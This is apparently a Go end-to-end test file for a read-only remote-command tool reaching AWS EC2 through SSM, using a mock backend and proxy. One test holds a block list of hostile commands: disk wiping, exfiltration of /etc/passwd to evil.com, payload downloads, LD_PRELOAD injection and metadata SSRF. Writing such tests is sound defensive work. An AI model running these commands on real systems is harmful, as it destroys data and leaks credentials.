package e2e

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os"
	"os/exec"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/aspectrr/lily/internal/cloud"
	"github.com/aspectrr/lily/internal/readonly"
)

// ============================================================================
// Ministack Docker container management
// ============================================================================

const ministackContainer = "lily-e2e-ministack"
const ministackPort = 4566

var ministackMu sync.Mutex
var ministackStarted bool

// ensureMinistack starts the ministack container if not already running.
func ensureMinistack(t *testing.T) {
	t.Helper()
	ministackMu.Lock()
	defer ministackMu.Unlock()

	if ministackStarted {
		return
	}

	// Reuse if already running.
	if resp, err := http.Get(fmt.Sprintf("http://localhost:%d/_ministack/health", ministackPort)); err == nil && resp.StatusCode == 200 {
		resp.Body.Close()
		ministackStarted = true
		t.Logf("reusing existing ministack container")
		return
	}

	// Clean up any previous container.
	_, _ = exec.Command("docker", "rm", "-f", ministackContainer).CombinedOutput()

	cmd := exec.Command("docker", "run", "-d",
		"--name", ministackContainer,
		"-p", fmt.Sprintf("%d:4566", ministackPort),
		"ministackorg/ministack",
	)
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("docker run ministack: %v: %s", err, out)
	}

	// Wait for ministack to be ready.
	for i := 0; i < 60; i++ {
		resp, err := http.Get(fmt.Sprintf("http://localhost:%d/_ministack/health", ministackPort))
		if err == nil && resp.StatusCode == 200 {
			resp.Body.Close()
			ministackStarted = true
			t.Logf("ministack ready after %d seconds", i)
			return
		}
		time.Sleep(1 * time.Second)
	}

	// Print container logs for debugging
	logs, _ := exec.Command("docker", "logs", ministackContainer).CombinedOutput()
	t.Fatalf("ministack did not become ready: %s", string(logs))
}

// stopMinistack removes the ministack container.
func stopMinistack() {
	_, _ = exec.Command("docker", "rm", "-f", ministackContainer).CombinedOutput()
}

// ministackEndpoint returns the base URL for Ministack.
func ministackEndpoint() string {
	return fmt.Sprintf("http://localhost:%d", ministackPort)
}

// ============================================================================
// EC2 helpers — real instances via Ministack
// ============================================================================

// createEC2Instance creates an EC2 instance via Ministack's real EC2 API
// and returns the instance ID. The instance is a mock (no real compute) but
// has a valid-looking ID that the AWS CLI will accept.
func createEC2Instance(t *testing.T) string {
	t.Helper()
	cmd := exec.Command("aws",
		"--endpoint-url", ministackEndpoint(),
		"--region", "us-east-1",
		"--no-sign-request",
		"ec2", "run-instances",
		"--image-id", "ami-12345678",
		"--instance-type", "t2.micro",
		"--query", "Instances[0].InstanceId",
		"--output", "text",
	)
	cmd.Env = append(os.Environ(),
		"AWS_ACCESS_KEY_ID=test",
		"AWS_SECRET_ACCESS_KEY=test",
	)
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("create EC2 instance: %v: %s", err, out)
	}
	id := strings.TrimSpace(string(out))
	if id == "" {
		t.Fatal("create EC2 instance: got empty instance ID")
	}
	t.Logf("created EC2 instance: %s", id)
	return id
}

// ============================================================================
// SSM Proxy — transparent proxy that adds Run Command on top of Ministack
// ============================================================================

// ssmProxy is a transparent reverse proxy in front of Ministack that adds
// SSM Run Command support. Ministack only provides SSM Parameter Store,
// not SendCommand/GetCommandInvocation, so we intercept those two actions
// and handle them ourselves. Everything else (EC2, IAM, etc.) is proxied
// to Ministack untouched.
//
// This lets us test lily's full chain: lily binary → aws CLI → real HTTP
// request → SSM API protocol → response parsing → output channeling.
type ssmProxy struct {
	URL       string
	server    *http.Server
	mu        sync.Mutex
	commands  map[string]*ssmCommand
	nextCmdID atomic.Int64
	respFn    ssmResponseFunc // optional custom response generator
}

// ssmResponseFunc generates a command result for a given command string.
// If nil, the default behavior is to echo the command text back as stdout.
type ssmResponseFunc func(command string) ssmCommandResult

type ssmCommand struct {
	instanceID string
	command    string
	result     ssmCommandResult
}

type ssmCommandResult struct {
	status   string // Success, Failed, TimedOut, Cancelled
	stdout   string
	stderr   string
	exitCode int
}

// newSSMProxy starts an SSM proxy on a random port, backed by Ministack.
func newSSMProxy(t *testing.T) *ssmProxy {
	t.Helper()

	target, _ := url.Parse(ministackEndpoint())
	proxy := httputil.NewSingleHostReverseProxy(target)

	// Override the Director to preserve the original Host header
	// so Ministack sees the request as if it came directly.
	originalDirector := proxy.Director
	proxy.Director = func(req *http.Request) {
		originalDirector(req)
		req.Host = target.Host
	}

	p := &ssmProxy{
		commands: make(map[string]*ssmCommand),
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		r.Body = io.NopCloser(strings.NewReader(string(body)))

		action := r.Header.Get("X-Amz-Target")

		switch action {
		case "AmazonSSM.SendCommand":
			p.handleSendCommand(t, w, r, body)
		case "AmazonSSM.GetCommandInvocation":
			p.handleGetCommandInvocation(t, w, r, body)
		default:
			// Forward everything else to Ministack untouched.
			proxy.ServeHTTP(w, r)
		}
	})

	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("listen: %v", err)
	}

	p.server = &http.Server{Handler: mux}
	p.URL = fmt.Sprintf("http://%s", listener.Addr().String())

	go p.server.Serve(listener)

	return p
}

func (p *ssmProxy) handleSendCommand(t *testing.T, w http.ResponseWriter, r *http.Request, body []byte) {
	p.mu.Lock()
	defer p.mu.Unlock()

	// Parse the AWS CLI JSON request body.
	var req map[string]interface{}
	if err := json.Unmarshal(body, &req); err != nil {
		t.Logf("SSM proxy: failed to parse SendCommand body: %v", err)
		w.Header().Set("Content-Type", "application/x-amz-json-1.1")
		w.WriteHeader(400)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"__type":  "InvalidRequest",
			"message": fmt.Sprintf("failed to parse request: %v", err),
		})
		return
	}

	// Extract instance IDs.
	var instanceID string
	if iids, ok := req["InstanceIds"].([]interface{}); ok && len(iids) > 0 {
		instanceID = fmt.Sprintf("%v", iids[0])
	}

	// Extract the command from Parameters.commands.
	var command string
	if params, ok := req["Parameters"].(map[string]interface{}); ok {
		if cmds, ok := params["commands"].([]interface{}); ok && len(cmds) > 0 {
			command = fmt.Sprintf("%v", cmds[0])
		}
	}

	// Generate a UUID-format command ID (AWS requires min 36 chars).
	id := p.nextCmdID.Add(1)
	cmdID := fmt.Sprintf("a1b2c3d4-e5f6-7890-abcd-%012d", id)

	// Determine the result.
	result := ssmCommandResult{
		status:   "Success",
		stdout:   command, // default: echo back the command
		stderr:   "",
		exitCode: 0,
	}

	// Use custom response function if set.
	if p.respFn != nil {
		result = p.respFn(command)
	}

	p.commands[cmdID] = &ssmCommand{
		instanceID: instanceID,
		command:    command,
		result:     result,
	}

	t.Logf("SSM proxy: SendCommand → %s (instance %s, command %q)", cmdID, instanceID, command)

	// Return proper AWS-format SendCommand response.
	w.Header().Set("Content-Type", "application/x-amz-json-1.1")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"Command": map[string]interface{}{
			"CommandId":         cmdID,
			"Status":            "Pending",
			"InstanceId":        instanceID,
			"DocumentName":      "AWS-RunShellScript",
			"RequestedDateTime": time.Now().Unix(),
		},
	})
}

func (p *ssmProxy) handleGetCommandInvocation(t *testing.T, w http.ResponseWriter, r *http.Request, body []byte) {
	p.mu.Lock()
	defer p.mu.Unlock()

	var req map[string]interface{}
	if err := json.Unmarshal(body, &req); err != nil {
		w.Header().Set("Content-Type", "application/x-amz-json-1.1")
		w.WriteHeader(400)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"__type":  "InvalidRequest",
			"message": fmt.Sprintf("failed to parse request: %v", err),
		})
		return
	}

	cmdID, _ := req["CommandId"].(string)
	instanceID, _ := req["InstanceId"].(string)
	_ = instanceID

	cmd, ok := p.commands[cmdID]
	if !ok {
		w.Header().Set("Content-Type", "application/x-amz-json-1.1")
		w.WriteHeader(400)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"__type":  "InvalidCommandId",
			"message": fmt.Sprintf("command %s not found", cmdID),
		})
		return
	}

	t.Logf("SSM proxy: GetCommandInvocation → %s (status=%s)", cmdID, cmd.result.status)

	// Return proper AWS-format GetCommandInvocation response.
	w.Header().Set("Content-Type", "application/x-amz-json-1.1")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"CommandId":             cmdID,
		"InstanceId":            cmd.instanceID,
		"Status":                cmd.result.status,
		"StandardOutputContent": cmd.result.stdout,
		"StandardErrorContent":  cmd.result.stderr,
		"ResponseCode":          cmd.result.exitCode,
		"DocumentName":          "AWS-RunShellScript",
	})
}

// SetResponseFn sets a custom response function. Each command sent through
// the proxy will have its result determined by calling fn(command).
func (p *ssmProxy) SetResponseFn(fn ssmResponseFunc) {
	p.mu.Lock()
	defer p.mu.Unlock()
	p.respFn = fn
}

func (p *ssmProxy) Close() {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	p.server.Shutdown(ctx)
}

// ============================================================================
// Helpers
// ============================================================================

// runLilyAWS runs the lily binary with the aws subcommand against the proxy.
// Returns combined stdout+stderr and error.
func runLilyAWS(t *testing.T, lilyBin string, endpoint string, extraArgs ...string) (string, error) {
	t.Helper()

	args := []string{"aws", "--endpoint-url", endpoint, "--no-sign-request", "--region", "us-east-1"}
	args = append(args, extraArgs...)

	cmd := exec.Command(lilyBin, args...)
	cmd.Env = append(os.Environ(),
		"AWS_ACCESS_KEY_ID=test",
		"AWS_SECRET_ACCESS_KEY=test",
		"AWS_DEFAULT_REGION=us-east-1",
	)
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// runAWSGoCode runs cloud.Run directly against the proxy.
func runAWSGoCode(t *testing.T, endpoint string, validator *readonly.Validator, command string, extraArgs ...string) (*cloud.Result, error) {
	t.Helper()

	args := []string{"--endpoint-url", endpoint, "--no-sign-request", "--region", "us-east-1", "ssm", "start-session"}
	args = append(args, extraArgs...)

	ctx := context.Background()
	timeout := 30 * time.Second
	maxOutput := int64(1024 * 1024)

	return cloud.Run(ctx, cloud.AWS, args, command, validator, timeout, maxOutput)
}

// buildLily builds the lily binary and returns its path.
func buildLily(t *testing.T) string {
	t.Helper()
	binPath := t.TempDir() + "/lily"
	cmd := exec.Command("go", "build", "-o", binPath, "./cmd/lily")
	cmd.Dir = projectRoot()
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("build lily: %v: %s", err, out)
	}
	return binPath
}

// projectRoot returns the lily project root directory.
func projectRoot() string {
	dir, _ := os.Getwd()
	for {
		if _, err := os.Stat(dir + "/go.mod"); err == nil {
			return dir
		}
		parent := dir + "/.."
		if parent == dir {
			break
		}
		dir = parent
	}
	return "."
}

// awsEnv returns environment variables for AWS CLI commands.
func awsEnv() []string {
	return append(os.Environ(),
		"AWS_ACCESS_KEY_ID=test",
		"AWS_SECRET_ACCESS_KEY=test",
		"AWS_DEFAULT_REGION=us-east-1",
	)
}

// ============================================================================
// Test suite entry point
// ============================================================================

func TestAWSMain(t *testing.T) {
	if os.Getenv("LILY_E2E_AWS") == "" {
		t.Skip("Set LILY_E2E_AWS=1 to run AWS E2E tests.")
	}

	ensureMinistack(t)
	t.Cleanup(func() {
		ministackMu.Lock()
		ministackStarted = false
		ministackMu.Unlock()
		stopMinistack()
	})

	// Verify Ministack is actually working by creating a real EC2 instance.
	t.Run("MinistackEC2", testMinistackEC2)

	// Unit-level tests (no Docker, no AWS CLI required)
	t.Run("SSMCommandParsing", testSSMCommandParsing)
	t.Run("SSMValidation", testSSMValidation)
	t.Run("SSMCommandBlocked", testSSMCommandBlocked)
	t.Run("SSMFlagPassthrough", testSSMFlagPassthrough)

	// Integration tests: Go code → aws CLI → SSM proxy → Ministack
	t.Run("SSMRunBasic", testSSMRunBasic)
	t.Run("SSMRunOutputChanneling", testSSMRunOutputChanneling)
	t.Run("SSMRunFailed", testSSMRunFailed)
	t.Run("SSMRunMultiple", testSSMRunMultiple)
	t.Run("SSMRealInstanceID", testSSMRealInstanceID)

	// Full CLI E2E: lily binary → aws CLI → SSM proxy → Ministack
	t.Run("SSMCLIRunSuccess", testSSMCLIRunSuccess)
	t.Run("SSMCLIRunFailed", testSSMCLIRunFailed)
	t.Run("SSMCLIBlocked", testSSMCLIBlocked)
	t.Run("SSMCLIInvalidSubcommand", testSSMCLIInvalidSubcommand)
	t.Run("SSMCLIMultiple", testSSMCLIMultiple)

	// Edge cases
	t.Run("EC2InstanceConnectBlocked", testEC2InstanceConnectBlocked)
}

// ============================================================================
// Ministack EC2 — verify Ministack provides a working AWS API
// ============================================================================

// testMinistackEC2 verifies that Ministack's EC2 API is working and can
// create instances. This validates that the rest of our tests have a
// real AWS-compatible API to talk to.
func testMinistackEC2(t *testing.T) {
	id := createEC2Instance(t)
	if !strings.HasPrefix(id, "i-") {
		t.Errorf("instance ID = %q, expected 'i-' prefix", id)
	}

	// Verify we can describe the instance.
	cmd := exec.Command("aws",
		"--endpoint-url", ministackEndpoint(),
		"--region", "us-east-1",
		"--no-sign-request",
		"ec2", "describe-instances",
		"--instance-ids", id,
		"--query", "Reservations[0].Instances[0].State.Name",
		"--output", "text",
	)
	cmd.Env = awsEnv()
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("describe-instances: %v: %s", err, out)
	}
	state := strings.TrimSpace(string(out))
	if state != "running" {
		t.Errorf("instance state = %q, want 'running'", state)
	}
}

// ============================================================================
// Unit tests — no Docker, no AWS CLI
// ============================================================================

// testSSMCommandParsing verifies that lily correctly parses AWS SSM command args.
func testSSMCommandParsing(t *testing.T) {
	tests := []struct {
		name       string
		args       []string
		wantCmd    string
		wantRemain int
	}{
		{
			name:       "basic --command flag",
			args:       []string{"ssm", "start-session", "--target", "i-12345", "--command", "ps aux"},
			wantCmd:    "ps aux",
			wantRemain: 4, // ssm start-session --target i-12345
		},
		{
			name:       "--command= form",
			args:       []string{"ssm", "start-session", "--target", "i-12345", "--command=uptime"},
			wantCmd:    "uptime",
			wantRemain: 4,
		},
		{
			name:       "no command",
			args:       []string{"ssm", "start-session", "--target", "i-12345"},
			wantCmd:    "",
			wantRemain: 4,
		},
		{
			name:       "global flags before ssm",
			args:       []string{"--endpoint-url", "http://localhost:4566", "--region", "us-east-1", "ssm", "start-session", "--target", "i-abc", "--command", "cat /etc/hosts"},
			wantCmd:    "cat /etc/hosts",
			wantRemain: 8, // --endpoint-url http://... --region us-east-1 ssm start-session --target i-abc
		},
		{
			name:       "--parameters JSON",
			args:       []string{"ssm", "start-session", "--target", "i-12345", "--parameters", `{"commands":["echo hi"]}`},
			wantCmd:    "echo hi",
			wantRemain: 4,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			remain, cmd := cloud.ParseCommand(tt.args)
			if cmd != tt.wantCmd {
				t.Errorf("command = %q, want %q", cmd, tt.wantCmd)
			}
			if len(remain) != tt.wantRemain {
				t.Errorf("remaining args = %d (%v), want %d", len(remain), remain, tt.wantRemain)
			}
		})
	}
}

// testSSMValidation tests ValidateSubcommand for AWS SSM.
func testSSMValidation(t *testing.T) {
	tests := []struct {
		name    string
		args    []string
		wantErr bool
	}{
		{"valid ssm start-session", []string{"ssm", "start-session", "--target", "i-xxx"}, false},
		{"valid with global flags", []string{"--endpoint-url", "http://x", "ssm", "start-session", "--target", "i-xxx"}, false},
		{"invalid ssm describe", []string{"ssm", "describe-instance-information"}, true},
		{"invalid s3 ls", []string{"s3", "ls"}, true},
		{"empty", []string{}, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := cloud.ValidateSubcommand(cloud.AWS, tt.args)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateSubcommand(%v) = %v, wantErr %v", tt.args, err, tt.wantErr)
			}
		})
	}
}

// testSSMCommandBlocked verifies that lily's read-only validation blocks
// dangerous commands even when they come through the AWS SSM path.
func testSSMCommandBlocked(t *testing.T) {
	v := readonly.DefaultValidator()

	// Each test case is a command that MUST be blocked when sent through SSM.
	// These are organized by category matching SECURITY.md.
	blocked := []struct {
		cmd    string
		reason string
	}{
		// ── Destructive file operations ──
		{"rm -rf /", "destructive delete"},
		{"rmdir /tmp/empty", "directory deletion"},
		{"mv /etc/hosts /tmp/", "file move"},
		{"cp /etc/shadow /tmp/", "file copy"},
		{"dd if=/dev/zero of=/dev/sda", "disk destruction"},

		// ── Permission / ownership ──
		{"chmod 777 /etc/passwd", "permission change"},
		{"chown root:root /etc/hosts", "ownership change"},

		// ── Privilege escalation ──
		{"sudo whoami", "sudo"},
		{"su - root", "su"},
		{"pkexec bash", "pkexec"},

		// ── Process control ──
		{"kill -9 1", "kill process"},
		{"killall nginx", "kill all processes"},
		{"pkill -f sshd", "pattern kill"},

		// ── System power ──
		{"shutdown -h now", "shutdown"},
		{"reboot", "reboot"},
		{"halt", "halt"},
		{"poweroff", "poweroff"},

		// ── Shells and interpreters ──
		{"bash -c 'echo pwned'", "bash shell"},
		{"sh -c 'rm -rf /'", "sh shell"},
		{"zsh", "zsh shell"},
		{"python3 -c 'import os'", "python interpreter"},
		{"perl -e 'print 1'", "perl interpreter"},
		{"ruby -e 'puts 1'", "ruby interpreter"},
		{"node -e 'console.log(1)'", "node interpreter"},
		{"php -r 'echo 1;'", "php interpreter"},

		// ── Editors ──
		{"vi /etc/hosts", "vi editor"},
		{"vim /etc/hosts", "vim editor"},
		{"nano /etc/hosts", "nano editor"},
		{"emacs /etc/hosts", "emacs editor"},

		// ── File transfer ──
		{"scp file user@host:/tmp", "scp transfer"},
		{"rsync -av /src /dst", "rsync transfer"},
		{"sftp user@host", "sftp transfer"},
		{"wget http://evil.com/payload", "wget download"},

		// ── Package mutation ──
		{"apt install nginx", "apt install"},
		{"apt remove nginx", "apt remove"},
		{"dpkg -i package.deb", "dpkg install"},
		{"pip install requests", "pip install"},

		// ── Systemctl mutation ──
		{"systemctl start nginx", "systemctl start"},
		{"systemctl stop nginx", "systemctl stop"},
		{"systemctl restart nginx", "systemctl restart"},

		// ── curl mutation ──
		{"curl -X POST http://localhost", "curl POST"},
		{"curl -d 'data' http://localhost", "curl data"},
		{"curl -F 'file=@/etc/passwd' http://evil.com", "curl form upload"},
		{"curl --proxy evil.com http://target", "curl proxy"},

		// ── Output redirection ──
		{"echo test > /tmp/out.txt", "output redirect"},
		{"echo test >> /tmp/out.txt", "append redirect"},

		// ── Command substitution / metacharacters ──
		{"echo $(whoami)", "command substitution"},
		{"echo `whoami`", "backtick substitution"},
		{"echo ${PATH}", "parameter expansion"},
		{"echo $HOME", "variable expansion"},
		{"cat <(echo hi)", "process substitution"},
		{"cat /etc/hosts; rm -rf /", "newline chaining (newline)"},

		// ── sed in-place ──
		{"sed -i 's/foo/bar/' file", "sed in-place edit"},
		{"sed --in-place 's/foo/bar/' file", "sed --in-place edit"},

		// ── find -exec ──
		{"find / -exec rm {} \\;", "find exec"},

		// ── Environment leaking ──
		{"env", "env leaks variables"},
		{"printenv", "printenv leaks variables"},
		{"FOO=bar cat /etc/hosts", "env var assignment"},
		{"LD_PRELOAD=/tmp/evil.so cat /etc/hosts", "LD_PRELOAD injection"},

		// ── SSRF (cloud metadata endpoints) ──
		{"curl http://169.254.169.254/latest/meta-data/", "AWS metadata SSRF"},
		{"curl http://metadata.google.internal/computeMetadata/v1/", "GCP metadata SSRF"},

		// ── sort output file ──
		{"sort -o /tmp/evil file", "sort writes file"},
	}

	for _, tc := range blocked {
		t.Run(tc.cmd, func(t *testing.T) {
			err := v.ValidateCommand(tc.cmd)
			if err == nil {
				t.Errorf("command %q should be blocked (%s)", tc.cmd, tc.reason)
			}
		})
	}
}

// testSSMFlagPassthrough verifies that global AWS flags are extracted correctly.
func testSSMFlagPassthrough(t *testing.T) {
	tests := []struct {
		name        string
		args        []string
		wantGlobals []string
	}{
		{
			name:        "--endpoint-url",
			args:        []string{"--endpoint-url", "http://localhost:4566", "ssm", "start-session", "--target", "i-xxx"},
			wantGlobals: []string{"--endpoint-url", "http://localhost:4566"},
		},
		{
			name:        "--region",
			args:        []string{"--region", "us-west-2", "ssm", "start-session", "--target", "i-xxx"},
			wantGlobals: []string{"--region", "us-west-2"},
		},
		{
			name:        "--endpoint-url and --region",
			args:        []string{"--endpoint-url", "http://localhost:4566", "--region", "us-west-2", "ssm", "start-session", "--target", "i-xxx"},
			wantGlobals: []string{"--endpoint-url", "http://localhost:4566", "--region", "us-west-2"},
		},
		{
			name:        "--endpoint-url=value form",
			args:        []string{"--endpoint-url=http://localhost:4566", "ssm", "start-session", "--target", "i-xxx"},
			wantGlobals: []string{"--endpoint-url=http://localhost:4566"},
		},
		{
			name:        "no global flags",
			args:        []string{"ssm", "start-session", "--target", "i-xxx"},
			wantGlobals: nil,
		},
		{
			name:        "--profile",
			args:        []string{"--profile", "test-profile", "ssm", "start-session", "--target", "i-xxx"},
			wantGlobals: []string{"--profile", "test-profile"},
		},
		{
			name:        "--no-sign-request (valueless)",
			args:        []string{"--no-sign-request", "ssm", "start-session", "--target", "i-xxx"},
			wantGlobals: []string{"--no-sign-request"},
		},
		{
			name:        "mixed valueless and valued",
			args:        []string{"--endpoint-url", "http://x", "--no-sign-request", "--region", "us-west-2", "ssm", "start-session", "--target", "i-xxx"},
			wantGlobals: []string{"--endpoint-url", "http://x", "--no-sign-request", "--region", "us-west-2"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := cloud.ExtractAWSGlobalFlags(tt.args)
			if len(got) != len(tt.wantGlobals) {
				t.Errorf("globals = %v, want %v", got, tt.wantGlobals)
				return
			}
			for i := range got {
				if got[i] != tt.wantGlobals[i] {
					t.Errorf("globals[%d] = %q, want %q", i, got[i], tt.wantGlobals[i])
				}
			}
		})
	}
}

// ============================================================================
// Integration tests — Go code → aws CLI → SSM proxy → Ministack
// ============================================================================

// testSSMRunBasic tests that a command sent through lily's Go code path
// reaches the SSM proxy and the output is correctly channeled back.
func testSSMRunBasic(t *testing.T) {
	proxy := newSSMProxy(t)
	defer proxy.Close()

	proxy.SetResponseFn(func(command string) ssmCommandResult {
		return ssmCommandResult{
			status:   "Success",
			stdout:   "Hello from EC2!\n",
			exitCode: 0,
		}
	})

	v := readonly.DefaultValidator()
	result, err := runAWSGoCode(t, proxy.URL, v, "echo hello world", "--target", "i-test123")
	if err != nil {
		t.Fatalf("cloud.Run failed: %v", err)
	}

	if result.Stdout != "Hello from EC2!\n" {
		t.Errorf("stdout = %q, want %q", result.Stdout, "Hello from EC2!\n")
	}
	if result.ExitCode != 0 {
		t.Errorf("exit code = %d, want 0", result.ExitCode)
	}
}

// testSSMRunOutputChanneling verifies that stdout, stderr, and exit codes
// are all correctly channeled from the SSM response through to the Result.
func testSSMRunOutputChanneling(t *testing.T) {
	proxy := newSSMProxy(t)
	defer proxy.Close()

	tests := []struct {
		name    string
		command string
		result  ssmCommandResult
	}{
		{
			name:    "stdout only",
			command: "cat /etc/hostname",
			result: ssmCommandResult{
				status:   "Success",
				stdout:   "ip-172-31-0-1\n",
				exitCode: 0,
			},
		},
		{
			name:    "stdout and stderr",
			command: "cat /var/log/syslog",
			result: ssmCommandResult{
				status:   "Success",
				stdout:   "May 11 12:00:00 ip-172-31-0-1 systemd[1]: Started\n",
				stderr:   "cat: /var/log/syslog: Permission denied on some lines\n",
				exitCode: 0,
			},
		},
		{
			name:    "large stdout",
			command: "ps aux",
			result: ssmCommandResult{
				status: "Success",
				stdout: "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n" +
					"root         1  0.0  0.1  12345  6789 ?        Ss   12:00   0:01 /sbin/init\n" +
					"root        42  0.0  0.2  23456  8901 ?        Ss   12:00   0:00 /usr/sbin/sshd\n" +
					"ec2-user  1001  0.0  0.1  34567  4567 ?        S    12:01   0:00 bash\n",
				exitCode: 0,
			},
		},
		{
			name:    "systemctl status",
			command: "systemctl status nginx",
			result: ssmCommandResult{
				status: "Success",
				stdout: "● nginx.service - A high performance web server and a reverse proxy server\n" +
					"   Loaded: loaded (/lib/systemd/system/nginx.service; enabled)\n" +
					"   Active: active (running) since Mon 2024-01-01 00:00:00 UTC\n" +
					"  Process: 1234 ExecStart=/usr/sbin/nginx (code=exited, status=0/SUCCESS)\n" +
					" Main PID: 1235 (nginx)\n" +
					"    Tasks: 5 (limit: 4915)\n" +
					"   Memory: 4.2M\n" +
					"      CPU: 100ms\n" +
					"   CGroup: /system.slice/nginx.service\n",
				exitCode: 0,
			},
		},
		{
			name:    "df -h output",
			command: "df -h",
			result: ssmCommandResult{
				status: "Success",
				stdout: "Filesystem      Size  Used Avail Use% Mounted on\n" +
					"/dev/nvme0n1p1  8.0G  2.1G  5.9G  27% /\n" +
					"tmpfs           1.9G     0  1.9G   0% /dev/shm\n",
				exitCode: 0,
			},
		},
		{
			name:    "empty output",
			command: "ls /empty-dir",
			result: ssmCommandResult{
				status:   "Success",
				stdout:   "",
				exitCode: 0,
			},
		},
		{
			name:    "multiline stderr",
			command: "find / -name '*.log'",
			result: ssmCommandResult{
				status:   "Success",
				stdout:   "/var/log/syslog\n/var/log/auth.log\n",
				stderr:   "find: '/proc/123': Permission denied\nfind: '/root': Permission denied\n",
				exitCode: 0,
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			proxy.SetResponseFn(func(command string) ssmCommandResult {
				return tt.result
			})

			v := readonly.DefaultValidator()
			result, err := runAWSGoCode(t, proxy.URL, v, tt.command, "--target", "i-output-test")
			if err != nil {
				t.Fatalf("cloud.Run failed: %v", err)
			}

			if result.Stdout != tt.result.stdout {
				t.Errorf("stdout mismatch:\ngot:  %q\nwant: %q", result.Stdout, tt.result.stdout)
			}
			if result.Stderr != tt.result.stderr {
				t.Errorf("stderr mismatch:\ngot:  %q\nwant: %q", result.Stderr, tt.result.stderr)
			}
			if result.ExitCode != tt.result.exitCode {
				t.Errorf("exit code = %d, want %d", result.ExitCode, tt.result.exitCode)
			}
		})
	}
}

// testSSMRunFailed tests handling of a command that fails on the remote instance.
func testSSMRunFailed(t *testing.T) {
	proxy := newSSMProxy(t)
	defer proxy.Close()

	proxy.SetResponseFn(func(command string) ssmCommandResult {
		return ssmCommandResult{
			status:   "Failed",
			stdout:   "",
			stderr:   "cat: /nonexistent: No such file or directory\n",
			exitCode: 1,
		}
	})

	v := readonly.DefaultValidator()
	result, err := runAWSGoCode(t, proxy.URL, v, "cat /nonexistent", "--target", "i-abc123")
	if err != nil {
		t.Fatalf("cloud.Run should not return error for failed commands: %v", err)
	}

	if result.ExitCode != 1 {
		t.Errorf("exit code = %d, want 1", result.ExitCode)
	}
	if !strings.Contains(result.Stderr, "No such file or directory") {
		t.Errorf("stderr = %q, should contain error message", result.Stderr)
	}
	if result.Stdout != "" {
		t.Errorf("stdout = %q, want empty", result.Stdout)
	}
}

// testSSMRunMultiple runs several commands in sequence through the same proxy
// to verify state is handled correctly.
func testSSMRunMultiple(t *testing.T) {
	proxy := newSSMProxy(t)
	defer proxy.Close()

	v := readonly.DefaultValidator()

	commands := []struct {
		cmd    string
		result ssmCommandResult
	}{
		{
			cmd: "uname -a",
			result: ssmCommandResult{
				status:   "Success",
				stdout:   "Linux ip-172-31-0-1 5.15.0 #1 SMP x86_64 GNU/Linux\n",
				exitCode: 0,
			},
		},
		{
			cmd: "whoami",
			result: ssmCommandResult{
				status:   "Success",
				stdout:   "ec2-user\n",
				exitCode: 0,
			},
		},
		{
			cmd: "df -h",
			result: ssmCommandResult{
				status:   "Success",
				stdout:   "Filesystem Size Used Avail Use%\n/dev/sda1  8G  2G  6G  25%\n",
				exitCode: 0,
			},
		},
		{
			cmd: "systemctl status nginx",
			result: ssmCommandResult{
				status:   "Success",
				stdout:   "● nginx.service - A high performance web server\n   Active: active (running)\n",
				exitCode: 0,
			},
		},
		{
			cmd: "cat /etc/hostname",
			result: ssmCommandResult{
				status:   "Success",
				stdout:   "ip-172-31-0-1\n",
				exitCode: 0,
			},
		},
	}

	for i, tt := range commands {
		t.Run(tt.cmd, func(t *testing.T) {
			proxy.SetResponseFn(func(command string) ssmCommandResult {
				return tt.result
			})

			result, err := runAWSGoCode(t, proxy.URL, v, tt.cmd, "--target", fmt.Sprintf("i-test-%d", i))
			if err != nil {
				t.Fatalf("command %q failed: %v", tt.cmd, err)
			}
			if result.Stdout != tt.result.stdout {
				t.Errorf("stdout = %q, want %q", result.Stdout, tt.result.stdout)
			}
			if result.ExitCode != tt.result.exitCode {
				t.Errorf("exit code = %d, want %d", result.ExitCode, tt.result.exitCode)
			}
		})
	}
}

// testSSMRealInstanceID uses a real EC2 instance ID from Ministack to verify
// that the full chain works with instance IDs that come from the real AWS API.
func testSSMRealInstanceID(t *testing.T) {
	instanceID := createEC2Instance(t)

	proxy := newSSMProxy(t)
	defer proxy.Close()

	proxy.SetResponseFn(func(command string) ssmCommandResult {
		return ssmCommandResult{
			status:   "Success",
			stdout:   "nginx is running\n",
			exitCode: 0,
		}
	})

	v := readonly.DefaultValidator()
	result, err := runAWSGoCode(t, proxy.URL, v, "systemctl status nginx", "--target", instanceID)
	if err != nil {
		t.Fatalf("cloud.Run with real instance ID %s failed: %v", instanceID, err)
	}
	if result.Stdout != "nginx is running\n" {
		t.Errorf("stdout = %q, want %q", result.Stdout, "nginx is running\n")
	}
}

// ============================================================================
// Full CLI E2E — lily binary → aws CLI → SSM proxy → Ministack
// ============================================================================

// testSSMCLIRunSuccess tests the full lily CLI path with a successful command.
// This exercises: lily binary → command parsing → validation → aws CLI invocation
// → SSM API call → response parsing → output channeling to stdout.
func testSSMCLIRunSuccess(t *testing.T) {
	proxy := newSSMProxy(t)
	defer proxy.Close()

	proxy.SetResponseFn(func(command string) ssmCommandResult {
		return ssmCommandResult{
			status:   "Success",
			stdout:   "nginx is running\n",
			exitCode: 0,
		}
	})

	lilyBin := buildLily(t)

